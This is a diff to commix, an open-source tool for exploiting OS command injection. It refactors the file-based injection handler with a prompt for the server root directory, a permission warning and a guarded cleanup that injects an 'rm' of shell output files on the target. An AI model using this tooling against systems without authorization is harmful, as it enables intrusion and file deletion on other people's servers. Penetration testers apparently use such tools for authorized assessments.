@@ -2,16 +2,16 @@
 # encoding: UTF-8
 
 """
- This file is part of commix (@commixproject) tool.
- Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
- https://github.com/stasinopoulos/commix
+This file is part of commix (@commixproject) tool.
+Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
+https://github.com/stasinopoulos/commix
 
- This program is free software: you can redistribute it and/or modify
- it under the terms of the GNU General Public License as published by
- the Free Software Foundation, either version 3 of the License, or
- (at your option) any later version.
+This program is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
  
- For more see the file 'readme/COPYING' for copying permission.
+For more see the file 'readme/COPYING' for copying permission.
 """
 
 import re
@@ -47,7 +47,8 @@ The "file-based" technique on Semiblind OS Command Injection.
 """
 
 """
-If temp-based technique failed, use the "/tmp/" directory for tempfile-based technique.
+Check ff temp-based technique has failed, 
+then use the "/tmp/" directory for tempfile-based technique.
 """
 def tfb_controller(no_result, url, delay, filename, tmp_path, http_request_method, url_time_response):
   if no_result == True:
@@ -58,7 +59,6 @@ def tfb_controller(no_result, url, delay, filename, tmp_path, http_request_metho
     sys.stdout.write("\r")
     sys.stdout.flush()
 
-
 """
 Delete previous shells outputs.
 """
@@ -66,12 +66,17 @@ def delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_
   cmd = "rm " + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE
   response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
 
+"""
+Provide custom server's root directory
+"""
+def custom_srv_root_dir():
+  settings.SRV_ROOT_DIR = raw_input("(?) Please provide the host's root directory (e.g. /var/www/) > ")
+  settings.CUSTOM_SRV_ROOT_DIR = True
 
 """
 The "file-based" injection technique handler
 """
 def fb_injection_handler(url, delay, filename, http_request_method, url_time_response):
-  
   counter = 1
   failed_tries = 20
   vp_flag = True
@@ -128,8 +133,8 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
           pass
 
       else:
-        settings.SRV_ROOT_DIR = raw_input("(?) Please provide the host's root directory (e.g. /var/www/) > ")
-        settings.CUSTOM_SRV_ROOT_DIR = True
+        # Provide custom server's root directory.
+        custom_srv_root_dir()
 
       path = urlparse.urlparse(url).path
       path_parts = path.split('/')
@@ -303,15 +308,21 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
           raise
 
         except SystemExit: 
-          # Delete previous shell (text) files (output)
-          delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+          if 'vuln_parameter' in locals():
+            # Delete previous shell (text) files (output)
+            delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+          else:
+            pass
+
+          #delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
           raise
 
         except urllib2.URLError, e:
           # print "\n" + Back.RED + "(x) Error: " + str(e.reason) + Style.RESET_ALL
-          # Delete previous shell (text) files (output)
-          delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
-          sys.exit(0)
+          print Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read and/or write files on '"+ settings.SRV_ROOT_DIR + "'." + Style.RESET_ALL
+          # Provide custom server's root directory.
+          custom_srv_root_dir()
+          continue
         
         except:
           raise
@@ -516,7 +527,6 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
   else :
     sys.stdout.write("\r")
     sys.stdout.flush()
-
 
 """
 The exploitation function.
